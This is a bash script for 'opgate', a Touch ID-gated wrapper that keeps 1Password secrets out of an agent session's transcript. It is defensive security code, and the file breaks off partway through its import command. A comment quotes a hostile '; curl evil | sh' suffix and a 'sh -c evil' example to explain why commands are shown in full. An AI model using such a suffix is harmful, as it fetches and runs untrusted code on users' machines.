#!/usr/bin/env bash
# opgate — reach 1Password secrets from an agent session, one Touch ID at a time.
#
# Design rule, and the reason this wrapper exists at all: a secret value must never
# reach the agent's stdout. Anything printed there lands in the conversation
# transcript and is shipped to a model provider, which defeats the point of keeping
# the secret in a vault. So secrets only ever travel to
#   * the environment of a child process   (run, exec)
#   * the macOS clipboard                  (copy)
#   * a git-ignored regular file           (inject)
# There is deliberately no `opgate read`.
#
# What this does NOT do: stop a determined caller. See references/security-model.md.
set -euo pipefail

# `bash -x opgate import .env` traced every expansion — including parsed values and
# the argument to the classifier — to stderr, and therefore into the transcript,
# before the Touch ID gate ever ran. Debugging must not be a disclosure channel.
case $- in *x*) set +x ;; esac
case $- in *v*) set +v ;; esac
unset BASH_XTRACEFD

OPGATE_BIN_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
OPGATE_SCRIPT_DIR=$(cd -- "$OPGATE_BIN_DIR/../scripts" && pwd)
# shellcheck source=../scripts/lib/common.sh
source "$OPGATE_SCRIPT_DIR/lib/common.sh"
# shellcheck source=../scripts/lib/gate.sh
source "$OPGATE_SCRIPT_DIR/lib/gate.sh"
# shellcheck source=../scripts/lib/classify.sh
source "$OPGATE_SCRIPT_DIR/lib/classify.sh"
# shellcheck source=../scripts/lib/scan.sh
source "$OPGATE_SCRIPT_DIR/lib/scan.sh"
# shellcheck source=../scripts/lib/grants.sh
source "$OPGATE_SCRIPT_DIR/lib/grants.sh"

usage() {
  cat >&2 <<'USAGE'
opgate — Touch ID-gated access to 1Password secrets

  opgate run    [-f FILE] -- CMD...     run CMD with the secrets in its env (masked)
  opgate exec   VAR=op://… -- CMD...    load exactly one secret for one command
  opgate inject -i TPL -o OUT           render a template to a file (must be gitignored)
  opgate copy   op://… [--seconds N]    secret -> clipboard, cleared after N seconds (90)
  opgate put    ITEM FIELD [--multiline] write a secret INTO 1Password (value from stdin)

  opgate scan   [PATH]                  find .env files and embedded secrets (prints no values)
  opgate import FILE [--yes] [--backup] move a .env into the vault and write <file>.op
  opgate items  [-p PROJECT]            list the vault items belonging to a project

  opgate list   [-f FILE]               list variable names + refs (never a value)
  opgate doctor [--test-gate]           check the whole setup
  opgate audit  [-n N]                  read the access log
  opgate build                          rebuild the Touch ID gate binary + record its hash

  opgate unlock [-m MIN] PATH...        stop the Read/Grep/Bash hook asking about
                                        these exact files for MIN minutes (60)
  opgate grants                         list the open windows and their time left
  opgate lock   [PATH...]               close them (no argument = close every one)

There is no `opgate read` — deliberately. See references/security-model.md.
Every command that touches a secret asks for Touch ID; no cache, no way to turn it off.

`unlock`/`lock`/`grants` only affect how often the hook re-asks about a plaintext
file already on your disk. They cannot skip a Touch ID prompt and cannot reach the
vault. See references/security-model.md.

Env: OPGATE_VAULT (Dev) · OPGATE_ENV_FILE (.env.op) · OPGATE_ALLOW_PASSWORD (1 to
     accept the device password in place of a fingerprint)
USAGE
}

# Rendering of the command for the Touch ID sheet. Arguments are bracketed so a
# value containing spaces cannot masquerade as two arguments. Nothing is cut from
# the END: an earlier 87-character cap hid exactly the `; curl evil | sh` suffix
# the docs tell you to read for. If the sheet cannot fit it, the count says so.
# Control characters and Unicode bidi overrides are stripped so a right-to-left
# override cannot make `sh -c evil` render as something benign.
cmd_summary() {
  local out="" a seq
  for a in "$@"; do
    a=$(printf '%s' "$a" | LC_ALL=C tr -d '\000-\037\177')
    for seq in $'\xe2\x80\xaa' $'\xe2\x80\xab' $'\xe2\x80\xac' $'\xe2\x80\xad' $'\xe2\x80\xae' \
               $'\xe2\x81\xa6' $'\xe2\x81\xa7' $'\xe2\x81\xa8' $'\xe2\x81\xa9'; do
      a=${a//"$seq"/}
    done
    out+="[$a]"
  done
  if (( ${#out} > 400 )); then
    out="${out:0:200}…(${#out} chars, middle elided)…${out:${#out}-180}"
  fi
  printf '%s' "$out"
}

# Ambient references: `op run` also resolves any op:// value already in the
# environment. Those never appeared on the sheet, so a `GITHUB_TOKEN=op://…` in
# a shell profile was silently approved along with every run. List them.
ambient_refs() {
  local line
  while IFS= read -r line; do
    case "$line" in *=op://*) printf '%s\n' "${line%%=*}" ;; esac
  done < <(env)
}

require_op() {
  command -v op >/dev/null 2>&1 \
    || die "the 1Password CLI is not installed. Install it: brew install --cask 1password-cli"
}
require_jq() {
  command -v jq >/dev/null 2>&1 \
    || die "opgate put needs jq. Install it: brew install jq"
}

# Run a command with a hard time limit. macOS ships no `timeout(1)`, and every
# `op` call can block forever while 1Password is locked.
with_timeout() { # <seconds> <cmd...>
  local secs="$1"; shift
  "$@" & local pid=$!
  ( sleep "$secs"; kill -9 "$pid" 2>/dev/null ) >/dev/null 2>&1 & local watcher=$!
  local rc=0; wait "$pid" 2>/dev/null || rc=$?
  kill -9 "$watcher" 2>/dev/null
  return $rc
}

# Refuse to write anywhere that is not a plain regular file. A device node turns
# "write a file" into "write to the transcript"; a FIFO hands the value to whoever
# is reading; a symlink lands somewhere other than the name you approved.
assert_safe_sink() { # <path> <resolved-path>
  local out="$1" real="$2"
  case "$real" in
    /dev/*|/proc/*)
      die "refusing to write to $real — that is not a file, so the secret would go straight to stdout/stderr or a device.
       If a command needs the secret, use: opgate run -- <cmd>" ;;
  esac
  if [[ -L "$out" ]]; then
    die "$out is a symlink — refusing, since the real target may not be where you think (it points at $(readlink -- "$out"))"
  fi
  if [[ -e "$real" && ! -f "$real" ]]; then
    die "$real exists but is not a regular file (FIFO, socket, device?) — refusing to write"
  fi
  # A hard link passes both checks above and would redirect the overwrite into
  # another name for the same inode.
  if [[ -f "$real" ]]; then
    local links; links=$(stat -f %l -- "$real" 2>/dev/null || printf 1)
    (( links > 1 )) && die "$real has $links hard links — writing here also changes every other name pointing at the same content"
  fi
}

# Write a dotenv value so that `op run` reads back exactly the bytes we have.
#   - safe charset: bare
#   - contains `$` or `\`: single-quoted (op takes single quotes literally, no
#     escapes) — possible only when the value has no single quote
#   - otherwise double-quoted with the only escapes op decodes: \n \" \\
# A value with both `$` and `'` cannot be expressed losslessly; refuse.
dotenv_quote() { # <value>
  local v="$1" bs=$'\\'
  [[ -z "$v" ]] && { printf ''; return; }
  [[ "$v" =~ ^[A-Za-z0-9_./:@+-]+$ ]] && { printf '%s' "$v"; return; }
  if [[ "$v" == *'$'* || "$v" == *"$bs"* ]]; then
    [[ "$v" == *"'"* ]] && die "a value containing both \$ and a single quote cannot be expressed in op syntax — fix it by hand"
    printf "'%s'" "$v"; return
  fi
  local out="" i c
  for (( i = 0; i < ${#v}; i++ )); do
    c="${v:i:1}"
    case "$c" in
      '"')   out+="${bs}\"" ;;
      $'\n') out+="${bs}n" ;;
      *)     out+="$c" ;;
    esac
  done
  printf '"%s"' "$out"
}

# Where a path really lands, after resolving `..` and any symlinked parent.
resolved_path() {
  local p="$1" dir base
  dir=$(dirname -- "$p"); base=$(basename -- "$p")
  dir=$(cd -- "$dir" 2>/dev/null && pwd -P) || die "no such directory: $(dirname -- "$p")"
  printf '%s/%s' "$dir" "$base"
}

# --- subcommands ------------------------------------------------------------

cmd_list() {
  local file=""
  while (( $# )); do
    case "$1" in
      -f|--env-file) [[ $# -ge 2 ]] || die "-f needs a path"; file="$2"; shift 2 ;;
      -h|--help) usage; exit 0 ;;
      *) die "opgate list: unknown argument '$1'" ;;
    esac
  done
  file=$(resolve_env_file "$file")

  printf '%s\n' "$file"
  local n=0 name value
  # Only op:// references are safe to print. A literal value is, by definition, the
  # thing we are trying to keep out of the transcript — show that it exists, not
  # what it is.
  while IFS=$'\t' read -r name value; do
    [[ -n "$name" ]] || continue
    # env_file_pairs emits the reference only when is_op_ref accepts it; a value
    # that merely starts with op:// (`op://hunter2`) arrives empty and is opaque.
    if [[ -n "$value" ]]; then
      printf '  %s = %s\n' "$name" "$value"
    else
      printf '  %s = <literal value, not printed>\n' "$name"
    fi
    n=$((n + 1))
  done < <(env_file_pairs "$file")

  local literals; literals=$(env_file_literals "$file" || true)
  if [[ -n "$literals" ]]; then
    warn "these variables hold a literal value rather than an op:// ref — that is a plaintext secret in a file the docs call safe to commit:"
    printf '        %s\n' $literals >&2
  fi
  (( n > 0 )) || warn "no variables in $file"
}

cmd_run() {
  require_op
  local file=""; local -a CMD=()
  while (( $# )); do
    case "$1" in
      -f|--env-file) [[ $# -ge 2 ]] || die "opgate run: -f needs a path"
                     file="$2"; shift 2 ;;
      -h|--help)     usage; exit 0 ;;
      --)            shift; CMD=("$@"); break ;;
      -*)            die "opgate run: unknown argument '$1' (usage: opgate run [-f FILE] -- CMD...)" ;;
      *)             CMD=("$@"); break ;;
    esac
  done
  (( ${#CMD[@]} )) || die "opgate run: no command to run — for example: opgate run -- npm run dev"
  file=$(resolve_env_file "$file")

  local -a vars=(); local v
  while IFS= read -r v; do [[ -n "$v" ]] && vars+=("$v"); done < <(env_file_vars "$file")
  (( ${#vars[@]} )) || die "$file declares no variables"
  # `exec` refuses PATH=op://…; `run` must too, or the file is the way around it.
  for v in "${vars[@]}"; do require_safe_var_name "$v"; done

  local literals; literals=$(env_file_literals "$file" || true)
  [[ -n "$literals" ]] && warn "$(basename -- "$file") has literal values ($(printf '%s ' $literals)) — op run canNOT mask those"

  local -a ambient=(); local a
  while IFS= read -r a; do [[ -n "$a" ]] && ambient+=("$a"); done < <(ambient_refs)
  local ambient_note=""
  (( ${#ambient[@]} )) && ambient_note=" + from the environment: $(summarize_list "${ambient[@]}")"

  # Shown relative to the project root, or absolute when outside it:
  # `-f ../prod/.env.op` must not look like the project's own file.
  local root; root=$(git rev-parse --show-toplevel 2>/dev/null || printf '%s' "$PWD")
  local shown="$file"; [[ "$file" == "$root"/* ]] && shown="${file#"$root"/}"

  gate_require "run" "$shown: $(IFS=,; printf '%s' "${vars[*]}")${ambient_note}" \
    "$(project_name) → run $(cmd_summary "${CMD[@]}") · $shown: $(summarize_list "${vars[@]}")${ambient_note}"

  # 1Password masks these values in the child's stdout/stderr by default. Never
  # pass --no-masking here.
  exec op run --env-file="$file" -- "${CMD[@]}"
}

cmd_exec() {
  require_op
  local spec=""; local -a CMD=()
  while (( $# )); do
    case "$1" in
      -h|--help) usage; exit 0 ;;
      --)        shift; CMD=("$@"); break ;;
      *)         if [[ -z "$spec" ]]; then spec="$1"; shift
                 else CMD=("$@"); break; fi ;;
    esac
  done
  [[ -n "$spec" ]] || die "opgate exec: no secret reference — for example: opgate exec DB=op://Dev/app/DB -- psql"
  (( ${#CMD[@]} )) || die "opgate exec: no command to run"

  local name ref
  if [[ "$spec" == *=op://* ]]; then
    name="${spec%%=*}"; ref="${spec#*=}"
  elif [[ "$spec" == op://* ]]; then
    ref="$spec"; name="${ref##*/}"
  else
    die "opgate exec: '$spec' is not a secret reference (expected op://... or VAR=op://...)"
  fi
  require_safe_var_name "$name"

  # The full reference goes on the sheet, not just the variable name:
  # DATABASE_URL=op://Prod/admin/root and a dev reference look identical otherwise.
  local -a ambient=(); local a
  while IFS= read -r a; do [[ -n "$a" ]] && ambient+=("$a"); done < <(ambient_refs)
  local ambient_note=""
  (( ${#ambient[@]} )) && ambient_note=" + from the environment: $(summarize_list "${ambient[@]}")"

  gate_require "exec" "$name=$ref${ambient_note}" \
    "$(project_name) → run $(cmd_summary "${CMD[@]}") with $name = $ref${ambient_note}"

  export "$name=$ref"
  exec op run -- "${CMD[@]}"
}

cmd_inject() {
  require_op
  local tpl="" out="" force=0
  while (( $# )); do
    case "$1" in
      -i|--in-file)  [[ $# -ge 2 ]] || die "-i needs a path"; tpl="$2"; shift 2 ;;
      -o|--out-file) [[ $# -ge 2 ]] || die "-o needs a path"; out="$2"; shift 2 ;;
      --force) force=1; shift ;;
      -h|--help) usage; exit 0 ;;
      *) die "opgate inject: unknown argument '$1'" ;;
    esac
  done
  [[ -n "$tpl" && -n "$out" ]] || die "opgate inject needs both -i TEMPLATE and -o OUTPUT"
  [[ -f "$tpl" ]] || die "no such template: $tpl"

  # Where the write really lands, not what the argument looks like. `--force` does
  # NOT relax these: a device node, FIFO or symlink target is how a "file" write
  # becomes a write to the transcript or to somewhere you did not name.
  local real; real=$(resolved_path "$out")
  assert_safe_sink "$out" "$real"

  # Rendering secrets to disk is the one operation here that leaves plaintext
  # behind, so refuse unless git is already set up to ignore the result.
  if ! git check-ignore -q -- "$out" 2>/dev/null; then
    if (( force )); then
      warn "$out is NOT git ignored — writing anyway because of --force. Do not commit this file."
    else
      die "$out is not git ignored. Add it to .gitignore first, or pass --force if you are sure.
       Consider \`opgate run\` instead — it never writes a secret to disk."
    fi
  fi

  local -a vars=(); local v
  while IFS= read -r v; do [[ -n "$v" ]] && vars+=("$v"); done < <(env_file_vars "$tpl")
  # A JSON/YAML template holds op:// references that are not VAR= lines, so fall
  # back to counting references rather than claiming "(none)" on the prompt.
  local refcount
  refcount=$( { grep -o 'op://[^"'"'"' 	]*' -- "$tpl" 2>/dev/null || true; } | wc -l | tr -d ' ')
  # A template can hold both `VAR=` lines and bare op:// references in JSON/YAML.
  # Reporting only the parsed variables under-reports what will be resolved, so
  # the reference count is always shown alongside.
  local scope
  if (( ${#vars[@]} )); then
    scope="$(summarize_list "${vars[@]}") · $refcount op:// references in the file"
  else
    scope="$refcount op:// references"
  fi

  gate_require "inject" "$(basename -- "$tpl") -> $real" \
    "$(project_name) → ghi secret ra file $(basename -- "$real"): $scope"

  ( umask 077; op inject -i "$tpl" -o "$real" -f )
  chmod 600 "$real" 2>/dev/null || true
  info "wrote $real (chmod 600) — delete it when you are done"
}

cmd_copy() {
  require_op
  command -v pbcopy >/dev/null 2>&1 || die "opgate copy needs pbcopy (macOS)"
  local ref="" seconds=90
  while (( $# )); do
    case "$1" in
      --seconds) [[ $# -ge 2 ]] || die "--seconds needs a number"
                 require_int "$2" "--seconds"; seconds="$2"; shift 2 ;;
      -h|--help) usage; exit 0 ;;
      op://*) ref="$1"; shift ;;
      *) die "opgate copy: unknown argument '$1'" ;;
    esac
  done
  [[ -n "$ref" ]] || die "opgate copy needs an op://... secret reference"

  gate_require "copy" "$ref" \
    "$(project_name) → copy $ref to the clipboard for ${seconds}s"

  op read --no-newline "$ref" | pbcopy

  # Hash what we just placed, once. An earlier version re-read the vault after the
  # delay to compare — a second, ungated secret access, which is exactly what this
  # tool exists to prevent, and which also failed to clear the clipboard whenever
  # the session had expired by then.
  local placed; placed=$(pbpaste 2>/dev/null | /usr/bin/shasum -a 256 | cut -d' ' -f1)
  info "copied ${ref##*/} to the clipboard; it clears itself after ${seconds}s"
  warn "a clipboard manager or Universal Clipboard may still hold a copy"

  # Clear only if the clipboard still holds what we put there, so we never wipe
  # something you copied in the meantime.
  ( sleep "$seconds"
    if [[ "$(pbpaste 2>/dev/null | /usr/bin/shasum -a 256 | cut -d' ' -f1)" == "$placed" ]]; then
      printf '' | pbcopy
    fi ) >/dev/null 2>&1 &
  disown 2>/dev/null || true
}

cmd_put() {
  require_op; require_jq
  local item="" field="" multiline=0
  while (( $# )); do
    case "$1" in
      --multiline) multiline=1; shift ;;
      -h|--help) usage; exit 0 ;;
      *) if   [[ -z "$item"  ]]; then item="$1";  shift
         elif [[ -z "$field" ]]; then field="$1"; shift
         else die "opgate put: unknown argument '$1'"; fi ;;
    esac
  done
  [[ -n "$item" && -n "$field" ]] || die "usage: opgate put <ITEM> <FIELD> [--multiline]  (the value is read from stdin)"

  local value
  if [[ ! -t 0 ]]; then
    # Piped input is taken whole: a PEM key or JSON blob must not be truncated at
    # the first newline. Only one trailing newline is stripped.
    value=$(cat; printf x); value="${value%x}"; value="${value%$'\n'}"
  elif (( multiline )); then
    printf 'Paste the value for %s/%s, then Ctrl-D:\n' "$item" "$field" >&2
    value=$(cat; printf x); value="${value%x}"; value="${value%$'\n'}"
  else
    printf 'Value for %s/%s (hidden, single line; use --multiline for more): ' "$item" "$field" >&2
    IFS= read -rs value; printf '\n' >&2
  fi
  [[ -n "$value" ]] || die "empty value, nothing written"

  # Does the item exist, and is it ours? `op item list` returns title, category
  # and tags only — no field values — so this check reads no secrets. Editing a
  # foreign item with a JSON template would drop its category, sections, URLs
  # and, as op's own help warns, any passkey.
  local exists=0 meta
  meta=$(op item list --vault "$OPGATE_VAULT" --format json </dev/null 2>/dev/null \
         | jq -c --arg t "$item" '[.[] | select(.title == $t)] | .[0] // empty') || meta=""
  if [[ -n "$meta" ]]; then
    exists=1
    local owned; owned=$(printf '%s' "$meta" \
      | jq -r 'if (.category == "SECURE_NOTE" and ((.tags // []) | index("opgate"))) then "yes" else "no" end')
    [[ "$owned" == "yes" ]] \
      || die "item \"$item\" already exists but was not created by opgate (no 'opgate' tag, or not a Secure Note).
       Editing it through a template would drop its category, sections, URLs and passkeys. Use a different item name."
  fi
  case "$field" in
    notesPlain|opgate_source) die "'$field' is an internal field name and cannot be used as a variable" ;;
  esac

  gate_require "put" "$item/$field" \
    "$(project_name) → store $field on item \"$item\" in vault $OPGATE_VAULT"

  # The value reaches jq through a file descriptor, never through argv — `op` warns
  # in its own help that command arguments are visible to other processes, and the
  # same is true of jq. Nothing is written to disk at any point: the item JSON is
  # piped straight from `op item get` into `op item edit`.
  if (( exists )); then
    op item edit "$item" --vault "$OPGATE_VAULT" --template <(
      op item get "$item" --vault "$OPGATE_VAULT" --format json </dev/null \
        | jq --rawfile v <(printf '%s' "$value") --arg f "$field" '
            .fields = ((.fields // []) | map(select(.label != $f)))
                    + [{ id: $f, type: "CONCEALED", label: $f, value: $v }]
            | .tags = (((.tags // []) + ["opgate"]) | unique)'
    ) </dev/null >/dev/null
    info "updated $field on item \"$item\""
  else
    # Fields must be top level (no section) so the reference stays
    # op://<vault>/<item>/<VAR>. notesPlain is part of the stock Secure Note
    # template; omitting it makes `op` reject the template.
    op item create --vault "$OPGATE_VAULT" --template <(
      jq -n --rawfile v <(printf '%s' "$value") --arg t "$item" --arg f "$field" '
        { title: $t, category: "SECURE_NOTE",
          fields: [ { id: "notesPlain", type: "STRING", purpose: "NOTES", label: "notesPlain", value: "" },
                    { id: $f, type: "CONCEALED", label: $f, value: $v } ] }'
    ) </dev/null >/dev/null
    info "created item \"$item\" with field $field"
  fi
  info "reference: op://$OPGATE_VAULT/$item/$field"
}

cmd_audit() {
  local n=20
  while (( $# )); do
    case "$1" in
      -n) [[ $# -ge 2 ]] || die "-n needs a number"; require_int "$2" "-n"; n="$2"; shift 2 ;;
      -h|--help) usage; exit 0 ;;
      *) die "opgate audit: unknown argument '$1'" ;;
    esac
  done
  [[ -f "$OPGATE_AUDIT_LOG" ]] || { info "no log yet ($OPGATE_AUDIT_LOG)"; return 0; }
  printf 'TIME\tSTATUS\tCALLER\tPROJECT\tACTION\tDETAIL\n'
  tail -n "$n" -- "$OPGATE_AUDIT_LOG"
}

cmd_doctor() {
  local test_gate=0 fail=0
  while (( $# )); do
    case "$1" in
      --test-gate) test_gate=1; shift ;;
      -h|--help) usage; exit 0 ;;
      *) die "opgate doctor: unknown argument '$1'" ;;
    esac
  done

  info "checking the setup"

  if command -v op >/dev/null 2>&1; then
    ok "1Password CLI $(op --version 2>/dev/null)"
  else
    bad "no 1Password CLI → brew install --cask 1password-cli"; fail=1
  fi

  if command -v jq >/dev/null 2>&1; then
    ok "jq $(jq --version 2>/dev/null)"
  else
    bad "no jq (opgate put needs it) → brew install jq"; fail=1
  fi

  if command -v op >/dev/null 2>&1; then
    if op vault list --format json </dev/null >/dev/null 2>&1; then
      ok "op is authorized (desktop app integration)"
      if op vault get "$OPGATE_VAULT" --format json </dev/null >/dev/null 2>&1; then
        ok "vault \"$OPGATE_VAULT\" exists"
      else
        bad "no vault \"$OPGATE_VAULT\" → op vault create $OPGATE_VAULT"; fail=1
      fi
    else
      bad "op cannot authorize → open 1Password, Settings ▸ Developer ▸ Integrate with 1Password CLI, then unlock the app"; fail=1
    fi
  fi

  if [[ -x "$OPGATE_GATE_BIN" ]]; then
    local vrc=0; _verify_gate_binary >/dev/null 2>&1 || vrc=$?
    if (( vrc == 2 )); then
      bad "the gate binary does not match the hash recorded at build time → check, then run: opgate build"; fail=1
    elif [[ ! -f "$OPGATE_GATE_SUM" ]]; then
      # Reported rather than swallowed: without a recorded hash the check passes
      # unconditionally, so calling the binary "healthy" would be misleading.
      bad "no reference hash recorded for the gate binary → opgate build"; fail=1
    else
      ok "gate binary: $OPGATE_GATE_BIN"
    fi
  else
    bad "the gate binary is not built → opgate build"; fail=1
  fi

  [[ "${OPGATE_ALLOW_PASSWORD:-}" =~ ^(1|true|yes)$ ]] \
    && warn "OPGATE_ALLOW_PASSWORD is on — the device password is accepted instead of a fingerprint"

  local file=""
  if file=$(resolve_env_file "" 2>/dev/null); then
    local count; count=$(env_file_vars "$file" | grep -c . || true)
    ok "$file — $count variables"
    local literals; literals=$(env_file_literals "$file" || true)
    if [[ -n "$literals" ]]; then
      bad "literal values (not op:// refs) in $file: $(printf '%s ' $literals)"; fail=1
    fi
  else
    warn "this project has no $OPGATE_ENV_FILE_DEFAULT yet (see references/project-setup.md)"
  fi

  local root; root=$(git rev-parse --show-toplevel 2>/dev/null || printf '%s' "$PWD")
  local -a plaintext=()
  local f
  for f in "$root"/.env "$root"/.env.local "$root"/*/.env; do
    [[ -f "$f" ]] && plaintext+=("${f#"$root"/}")
  done
  if (( ${#plaintext[@]} )); then
    warn "plaintext .env still in the repo: $(printf '%s ' "${plaintext[@]}")"
  fi

  # An open window is the one piece of state that makes the guards quieter than
  # they look, so doctor has to say it out loud rather than let you wonder why a
  # .env read went through without a prompt.
  local windows; windows=$(grant_list)
  if [[ -n "$windows" ]]; then
    local left origin path
    while IFS=$'\t' read -r left origin path; do
      [[ -n "$path" ]] || continue
      warn "hook approval window open: $path — $(( left / 60 ))m left ($origin). \`opgate lock\` closes it."
    done <<<"$windows"
  fi

  if (( test_gate )); then
    info "testing the authentication prompt — touch the sensor to confirm…"
    if gate_require "doctor" "self-test" "$(project_name) → opgate doctor self-test"; then
      ok "the authentication prompt works"
    fi
  fi

  if (( fail )); then
    printf '\n' >&2; warn "some checks failed (see ✘ above)"; return 1
  fi
  printf '\n' >&2; info "all good"
}

cmd_scan() {
  local target="" env_only=0
  while (( $# )); do
    case "$1" in
      --env-only) env_only=1; shift ;;
      -h|--help) usage; exit 0 ;;
      *) target="$1"; shift ;;
    esac
  done
  local root
  if [[ -n "$target" ]]; then root=$(cd -- "$target" && pwd -P)
  else root=$(git rev-parse --show-toplevel 2>/dev/null || printf '%s' "$PWD"); fi
  local project; project=$(basename -- "$root")
  [[ "$root" == *:* ]] && die "the project path contains ':' ($root) — file:line output cannot be parsed safely; move the project somewhere else"

  printf 'project: %s\n%s\n\n' "$project" "$root"

  local -a envfiles=(); local f
  while IFS= read -r f; do [[ -n "$f" ]] && envfiles+=("$f"); done < <(find_env_files "$root")

  # Best effort, time-boxed: a locked 1Password makes `op` block indefinitely, and
  # scan must still be useful with no vault access at all.
  local vault_titles=""
  vault_titles=$(with_timeout 5 op item list --vault "$OPGATE_VAULT" --format json 2>/dev/null \
                 | jq -r '.[].title' 2>/dev/null) || vault_titles=""
  [[ -n "$vault_titles" ]] || info "cannot read the vault (locked or not configured) — skipping the status column"

  if (( ${#envfiles[@]} == 0 )); then
    printf 'no .env files found\n'
  else
    printf 'file env (%d):\n' "${#envfiles[@]}"
    local i n v kind s c pl em item rel
    for f in ${envfiles[@]+"${envfiles[@]}"}; do
      rel="${f#"$root"/}"
      item=$(item_name_for "$f" "$project" "$root")
      parse_env_file "$f"
      s=0; c=0; pl=0; em=0
      for (( i = 0; i < ${#OPG_NAMES[@]}; i++ )); do
        kind=$(classify_var "${OPG_NAMES[$i]}" "${OPG_VALUES[$i]}")
        case "$kind" in
          secret|ambiguous) s=$((s+1)) ;;
          config) c=$((c+1)) ;;
          placeholder) pl=$((pl+1)) ;;
          empty) em=$((em+1)) ;;
        esac
      done
      printf '  %-40s -> op://%s/%s/<VAR>' "$rel" "$OPGATE_VAULT" "$item"
      if [[ -z "$vault_titles" ]]; then
        printf '\n'
      elif printf '%s' "$vault_titles" | grep -qxF "$item"; then
        printf '  [already in the vault]\n'
      else
        printf '  [not yet]\n'
      fi
      printf '     %d to vault · %d config · %d placeholder · %d empty\n' "$s" "$c" "$pl" "$em"
    done
    printf '\n  move into the vault:  opgate import <file>\n'
  fi

  (( env_only )) && return 0

  printf '\nsecrets embedded in other files:\n'
  local hits=0 f2 ln label
  # One pass over the whole file list per pattern, rather than every pattern
  # against every file: the old shape re-read each selected file 11 times.
  while IFS=$'\t' read -r f2 ln label; do
    [[ -n "$f2" ]] || continue
    printf '  %s:%s\t%s\n' "${f2#"$root"/}" "$ln" "$label"
    hits=$((hits + 1))
  done < <(find_config_files "$root" | scan_embedded_list | sort -u)

  if (( hits == 0 )); then
    printf '  nothing found\n'
  else
    printf '\n  %d hits. These are values sitting in config or source files, not\n' "$hits"
    printf '  environment variables — `opgate import` canNOT fix them, since that needs a code change.\n'
    printf '  Rotate anything that is a real credential; opgate reports the location, never the value.\n'
  fi
}

cmd_import() {
  require_op; require_jq
  local file="" project="" item="" assume_yes=0 dry=0 want_backup=0 force=0
  while (( $# )); do
    case "$1" in
      -p|--project) [[ $# -ge 2 ]] || die "--project needs a name"; project="$2"; shift 2 ;;
      --item)       [[ $# -ge 2 ]] || die "--item needs a name"; item="$2"; shift 2 ;;
      -y|--yes)     assume_yes=1; shift ;;
      --dry-run)    dry=1; shift ;;
      --backup)     want_backup=1; shift ;;
      --force)      force=1; shift ;;
      -h|--help)    usage; exit 0 ;;
      *) [[ -z "$file" ]] || die "opgate import: takes exactly one file"; file="$1"; shift ;;
    esac
  done
  [[ -n "$file" ]] || die "usage: opgate import <.env file> [--project NAME] [--item NAME] [--yes]"
  [[ -f "$file" ]] || die "no such file: $file"
  file=$(resolved_path "$file")

  local root; root=$(git rev-parse --show-toplevel 2>/dev/null || dirname -- "$file")
  [[ -n "$project" ]] || project=$(basename -- "$root")
  [[ -n "$item" ]] || item=$(item_name_for "$file" "$project" "$root")
  # An item title feeds op:// references and the generated file. A slash makes an
  # invalid reference; a newline could inject a second assignment into .env.op.
  [[ "$item" =~ ^[A-Za-z0-9._-]+$ ]] \
    || die "invalid item name: '$item' — only letters, digits and . _ - are accepted"
  [[ "$project" =~ ^[A-Za-z0-9._-]+$ ]] \
    || die "invalid project name: '$project'"

  parse_env_file "$file"
  (( ${#OPG_NAMES[@]} )) || die "$file has no variables"

  # Decide what goes to the vault. Ambiguous entries are settled by you, and the
  # question shows the SHAPE of the value, never the value: deciding does not
  # require seeing it, and printing it would put it in the transcript.
  local -a vault_idx=() literal_idx=() ambiguous_idx=()
  local i name kind ans
  for (( i = 0; i < ${#OPG_NAMES[@]}; i++ )); do
    name="${OPG_NAMES[$i]}"
    kind=$(classify_var "$name" "${OPG_VALUES[$i]}")
    case "$kind" in
      secret)  vault_idx+=("$i") ;;
      config|placeholder|empty|reference) literal_idx+=("$i") ;;
      ambiguous) ambiguous_idx+=("$i") ;;
    esac
  done

  # An ambiguous variable is a judgement call, so it is yours. `--yes` sends them
  # all to the vault, which is the safe direction: a config value in the vault
  # costs a round trip, a secret left in a committable file costs a rotation.
  if (( ${#ambiguous_idx[@]} )); then
    if (( assume_yes )); then
      # Checked before --dry-run so that `--yes --dry-run` previews the real plan
      # rather than a list of questions it would never ask.
      for i in ${ambiguous_idx[@]+"${ambiguous_idx[@]}"}; do vault_idx+=("$i"); done
      ambiguous_idx=()
    elif (( dry )); then
      : # listed separately below; a dry run must not prompt
    elif [[ -t 0 ]]; then
      printf '\n%d variables could not be classified with confidence. The values are NOT printed —\n' "${#ambiguous_idx[@]}" >&2
      printf 'only their shape, because printing one puts it in the transcript.\n\n' >&2
      for i in ${ambiguous_idx[@]+"${ambiguous_idx[@]}"}; do
        printf '  %s — %s\n' "${OPG_NAMES[$i]}" "$(describe_value "${OPG_VALUES[$i]}")" >&2
        printf '    move into the vault? [Y/n] ' >&2
        # Read from stdin, which the `-t 0` above proved is a terminal. Reading
        # /dev/tty instead looked equivalent and was not: it opens successfully in
        # an agent session with a controlling terminal nobody is watching, returns
        # EOF immediately, and every ambiguous variable silently defaulted to yes.
        IFS= read -r ans || ans=y
        case "$ans" in [nN]*) literal_idx+=("$i") ;; *) vault_idx+=("$i") ;; esac
      done
    else
      # No terminal to ask on — an agent running this unattended. Refuse rather
      # than guess: guessing wrong either leaks a secret into a committable file
      # or quietly vaults something that did not need it.
      printf '\n' >&2
      for i in ${ambiguous_idx[@]+"${ambiguous_idx[@]}"}; do
        printf '  %s — %s\n' "${OPG_NAMES[$i]}" "$(describe_value "${OPG_VALUES[$i]}")" >&2
      done
      die "${#ambiguous_idx[@]} variables above need your decision, and there is no terminal to ask on.
       Run this in a terminal, or pass --yes to send all of them to the vault."
    fi
  fi

  local -a vault_names=()
  for i in ${vault_idx[@]+"${vault_idx[@]}"}; do vault_names+=("${OPG_NAMES[$i]}"); done

  printf '\n%s\n' "$file" >&2
  printf '  vault  : %s -> op://%s/%s/<VAR>\n' "${#vault_idx[@]} variables" "$OPGATE_VAULT" "$item" >&2
  printf '  literal: %s kept as-is in the .op file\n' "${#literal_idx[@]} variables" >&2
  (( ${#ambiguous_idx[@]} )) && printf '  to ask : %s\n' "${#ambiguous_idx[@]} variables" >&2

  if (( dry )); then
    printf '\n  --dry-run: nothing was written\n' >&2
    for i in ${vault_idx[@]+"${vault_idx[@]}"}; do printf '    vault     %s\n' "${OPG_NAMES[$i]}" >&2; done
    for i in ${ambiguous_idx[@]+"${ambiguous_idx[@]}"}; do
      printf '    would ask %s — %s\n' "${OPG_NAMES[$i]}" "$(describe_value "${OPG_VALUES[$i]}")" >&2
    done
    for i in ${literal_idx[@]+"${literal_idx[@]}"}; do printf '    literal   %s\n' "${OPG_NAMES[$i]}" >&2; done
    return 0
  fi
